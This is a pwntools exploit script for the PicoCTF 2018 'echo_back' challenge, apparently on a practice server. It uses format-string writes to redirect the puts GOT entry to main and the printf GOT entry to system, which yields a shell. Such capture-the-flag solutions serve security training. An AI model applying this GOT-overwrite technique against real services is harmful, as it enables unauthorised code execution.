from pwn import *

#p = process('./PicoCTF_2018_echo_back')
p = remote('node4.buuoj.cn', 28513)

elf = ELF('PicoCTF_2018_echo_back')

puts_got = elf.got['puts']
main = elf.sym['main']

system_plt = elf.plt['system']
printf_got = elf.got['printf']

payload = fmtstr_payload(7, { puts_got : main })

p.recvuntil(b'message:')

p.sendline(payload)

payload = fmtstr_payload(7, { printf_got : system_plt })

p.recvuntil(b'message:')

p.sendline(payload)

p.interactive()